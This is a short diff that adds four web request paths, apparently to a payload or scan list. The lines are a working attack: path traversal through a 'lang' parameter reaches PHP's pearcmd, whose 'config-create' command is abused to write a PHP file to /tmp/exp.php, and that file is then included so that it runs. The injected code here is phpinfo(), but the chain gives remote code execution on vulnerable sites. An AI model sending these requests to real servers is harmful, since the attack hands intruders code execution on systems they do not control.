@@ -1,0 +1,4 @@
+/public/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/%3C?phpinfo();%3E+/tmp/exp.php
+/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/%3C?phpinfo();%3E+/tmp/exp.php
+/public/index.php?lang=../../../../../../../../tmp/exp
+/index.php?lang=../../../../../../../../tmp/exp
